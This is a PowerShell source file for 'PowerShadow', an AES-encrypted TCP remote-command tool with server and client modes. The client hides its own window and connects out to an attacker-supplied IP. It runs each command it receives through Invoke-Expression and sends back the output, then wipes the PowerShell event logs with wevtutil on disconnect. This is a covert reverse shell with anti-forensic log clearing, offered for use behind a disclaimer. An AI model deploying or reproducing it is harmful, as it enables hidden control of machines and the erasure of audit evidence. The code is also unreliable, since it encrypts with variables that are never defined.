#!/usr/bin/env pwsh
<#
    
    This script supports two modes: Server and Client.

    In TCP mode the server listens on a TCP port (default 9090) for an incoming client connection.
    Commands entered on the server are encrypted using AES‑256 (CBC with PKCS7 padding) and sent over TCP
    with a 4‑byte length prefix. The client decrypts and executes the command, then encrypts the output
    and sends it back using the same protocol.

    The encryption key and IV are derived from a passphrase (entered securely) and a salt using PBKDF2.
    The client’s PowerShell window is hidden, and when the connection ends the client will clear
    selected Windows and PowerShell event logs.

    DISCLAIMER: This tool is for educational and authorized security testing purposes ONLY!
#>

param(
    [Parameter(Mandatory = $true)]
    [ValidateSet("Client", "Server")]
    [string]$Mode,

    [string]$ServerIP,  # Required in Client mode.
    [int]$Port = 9090  # Default TCP port.
)

# ----------------- Secure Passphrase Prompt & Key Derivation -----------------
$securePSPass = Read-Host "Enter passphrase" -AsSecureString
$PowerShadowPassphrase = [Runtime.InteropServices.Marshal]::PtrToStringBSTR(
    [Runtime.InteropServices.Marshal]::SecureStringToBSTR($securePSPass)
)
# For salt, you can use a constant non-secret value or prompt similarly.
$PowerShadowSalt = "UniqueSaltValue"  # Both sides must use the same salt.

function PowerShadowDeriveKeyAndIV {
    param(
        [Parameter(Mandatory = $true)][string]$Passphrase,
        [Parameter(Mandatory = $true)][string]$Salt,
        [int]$Iterations = 10000
    )
    $saltBytes = [Text.Encoding]::UTF8.GetBytes($Salt)
    $derive = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($Passphrase, $saltBytes, $Iterations)
    $psKey = $derive.GetBytes(32)  # 256-bit key
    $psIV  = $derive.GetBytes(16)  # 128-bit IV
    return @{ Key = $psKey; IV = $psIV }
}

$psDerived = PowerShadowDeriveKeyAndIV -Passphrase $PowerShadowPassphrase -Salt $PowerShadowSalt
$PowerShadowKey = $psDerived.Key
$PowerShadowIV = $psDerived.IV

# ----------------- Encryption/Decryption Functions -----------------

function PowerShadowEncryptText {
    param(
        [Parameter(Mandatory = $true)][string]$PlainText,
        [Parameter(Mandatory = $true)][byte[]]$Key,
        [Parameter(Mandatory = $true)][byte[]]$InitVector
    )
    $aes = New-Object System.Security.Cryptography.AesManaged
    $aes.KeySize = 256
    $aes.BlockSize = 128
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $encryptor = $aes.CreateEncryptor($Key, $InitVector)
    $plainBytes = [Text.Encoding]::UTF8.GetBytes($PlainText)
    $ms = New-Object System.IO.MemoryStream
    $cs = New-Object System.Security.Cryptography.CryptoStream($ms, $encryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
    $cs.Write($plainBytes, 0, $plainBytes.Length)
    $cs.FlushFinalBlock()
    $encryptedBytes = $ms.ToArray()
    $cs.Close(); $ms.Close(); $aes.Dispose()
    return [Convert]::ToBase64String($encryptedBytes)
}

function PowerShadowDecryptText {
    param(
        [Parameter(Mandatory = $true)][string]$CipherText,
        [Parameter(Mandatory = $true)][byte[]]$Key,
        [Parameter(Mandatory = $true)][byte[]]$InitVector
    )
    $aes = New-Object System.Security.Cryptography.AesManaged
    $aes.KeySize = 256
    $aes.BlockSize = 128
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $decryptor = $aes.CreateDecryptor($Key, $InitVector)
    $cipherBytes = [Convert]::FromBase64String($CipherText)
    $ms = New-Object System.IO.MemoryStream
    $cs = New-Object System.Security.Cryptography.CryptoStream($ms, $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
    $cs.Write($cipherBytes, 0, $cipherBytes.Length)
    $cs.FlushFinalBlock()
    $ms.Position = 0
    $sr = New-Object System.IO.StreamReader($ms)
    $plaintext = $sr.ReadToEnd()
    $cs.Close(); $ms.Close(); $aes.Dispose()
    return $plaintext
}

# ----------------- TCP Mode Functions -----------------

if ($Mode -eq "Server") {
    
    $banner = @"
                                  _               _               
 _ __   _____      _____ _ __ ___| |__   __ _  __| | _____      __
| '_ \ / _ \ \ /\ / / _ \ '__/ __| '_ \ / _` |/ _` |/ _ \ \ /\ / /
| |_) | (_) \ V  V /  __/ |  \__ \ | | | (_| | (_| | (_) \ V  V / 
| .__/ \___/ \_/\_/ \___|_|  |___/_| |_|\__,_|\__,_|\___/ \_/\_/  
|_|                                                               
                                                                    
"@
    Write-Host $banner

    Write-Host "[*] Running in Encrypted TCP Server Mode"
    $listener = [System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Any, $Port)
    $listener.Start()
    Write-Host "[*] Listening on port $Port. Waiting for client connection..."

    # Register CancelKeyPress only if not on Linux.
    if (-not [System.Runtime.InteropServices.RuntimeInformation]::IsOSPlatform([System.Runtime.InteropServices.OSPlatform]::Linux)) {
        [Console]::CancelKeyPress += {
            Write-Host "Ctrl+C pressed. Cancelling connection..."
            $listener.Stop()
            exit
        }
    }
    
    try {
        $client = $listener.AcceptTcpClient()
    } catch {
        Write-Host "Connection cancelled."
        exit
    }
    Write-Host "[*] Client connected from $($client.Client.RemoteEndPoint)"
    $stream = $client.GetStream()
    
    while ($true) {
        $userCommand = Read-Host "Enter command (or 'exit' to quit)"
        if ($userCommand -eq "exit") {
            $encryptedCommand = PowerShadowEncryptText -PlainText $userCommand -Key $key -InitVector $InitVector
            $cmdBytes = [Text.Encoding]::UTF8.GetBytes($encryptedCommand)
            $lengthBytes = [BitConverter]::GetBytes($cmdBytes.Length)
            $stream.Write($lengthBytes, 0, 4)
            $stream.Write($cmdBytes, 0, $cmdBytes.Length)
            $stream.Flush()
            break
        }
        $encryptedCommand = PowerShadowEncryptText -PlainText $userCommand -Key $key -InitVector $InitVector
        $cmdBytes = [Text.Encoding]::UTF8.GetBytes($encryptedCommand)
        $lengthBytes = [BitConverter]::GetBytes($cmdBytes.Length)
        $stream.Write($lengthBytes, 0, 4)
        $stream.Write($cmdBytes, 0, $cmdBytes.Length)
        $stream.Flush()
        Write-Host "[*] Command sent. Awaiting response..."
        $respLengthBytes = New-Object Byte[] 4
        $bytesRead = $stream.Read($respLengthBytes, 0, 4)
        if ($bytesRead -ne 4) {
            Write-Host "[-] Error reading response length. Exiting."
            break
        }
        $respLength = [BitConverter]::ToInt32($respLengthBytes, 0)
        $respBytes = New-Object Byte[] $respLength
        $totalRead = 0
        while ($totalRead -lt $respLength) {
            $n = $stream.Read($respBytes, $totalRead, $respLength - $totalRead)
            $totalRead += $n
        }
        $encryptedOutput = [Text.Encoding]::UTF8.GetString($respBytes)
        $output = PowerShadowDecryptText -CipherText $encryptedOutput -Key $key -InitVector $InitVector
        Write-Host "[*] Response:`n$output"
    }
    $stream.Close(); $client.Close(); $listener.Stop()
    Write-Host "[*] Server shutdown."
}
elseif ($Mode -eq "Client") {
    # Hide the PowerShell window
    $hwnd = (Get-Process -Id $PID).MainWindowHandle
    if ($hwnd -ne [IntPtr]::Zero) {
        $code = @'
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("user32.dll")]
    public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
}
'@
        Add-Type $code
        [Win32]::ShowWindowAsync($hwnd, 0) | Out-Null  # 0 = SW_HIDE
    }
    
    if (-not $ServerIP) {
        Write-Error "For Client mode, you must provide -ServerIP."
        exit 1
    }
    Write-Host "[*] Running in Encrypted TCP Client Mode"
    $client = New-Object System.Net.Sockets.TcpClient
    try {
        $client.Connect($ServerIP, $Port)
    } catch {
        Write-Error "Failed to connect to $ServerIP on port $Port. $_"
        exit 1
    }
    Write-Host "[*] Connected to server at ${ServerIP}:$Port"
    $stream = $client.GetStream()
    while ($true) {
        try {
            $lengthBytes = New-Object Byte[] 4
            $read = $stream.Read($lengthBytes, 0, 4)
            if ($read -ne 4) {
                Write-Host "[-] Server disconnected."
                break
            }
        } catch {
            Write-Host "[-] Error reading from stream. Exiting."
            break
        }
        $cmdLength = [BitConverter]::ToInt32($lengthBytes, 0)
        if ($cmdLength -le 0) { break }
        $cmdBytes = New-Object Byte[] $cmdLength
        $totalRead = 0
        while ($totalRead -lt $cmdLength) {
            $n = $stream.Read($cmdBytes, $totalRead, $cmdLength - $totalRead)
            if ($n -le 0) { break }
            $totalRead += $n
        }
        if ($totalRead -ne $cmdLength) {
            Write-Host "[-] Incomplete command received. Exiting."
            break
        }
        $encryptedCommand = [Text.Encoding]::UTF8.GetString($cmdBytes)
        $command = PowerShadowDecryptText -CipherText $encryptedCommand -Key $key -InitVector $InitVector
        if ($command -eq "exit") { break }
        Write-Host "[*] Received command: $command"
        try {
            $output = Invoke-Expression $command | Out-String
        } catch {
            $output = "Error executing command: $_"
        }
        $encryptedOutput = PowerShadowEncryptText -PlainText $output -Key $key -InitVector $InitVector
        $outputBytes = [Text.Encoding]::UTF8.GetBytes($encryptedOutput)
        $lenBytes = [BitConverter]::GetBytes($outputBytes.Length)
        $stream.Write($lenBytes, 0, 4)
        $stream.Write($outputBytes, 0, $outputBytes.Length)
        $stream.Flush()
    }
    $stream.Close(); $client.Close()
    
    # Clear PowerShell and Windows event logs upon disconnect.
    function Clear-EventLogs {
        Write-Host "[*] Clearing event logs..."
        try {
            wevtutil cl "Windows PowerShell"
            wevtutil cl "Microsoft-Windows-PowerShell/Operational"
            Write-Host "[*] Event logs cleared."
        } catch {
            Write-Host "[-] Failed to clear event logs: $_"
        }
    }
    Clear-EventLogs
    Write-Host "[*] Client shutdown."
}
else {
    Write-Error "Invalid mode specified. Use -Mode Client or -Mode Server."
}
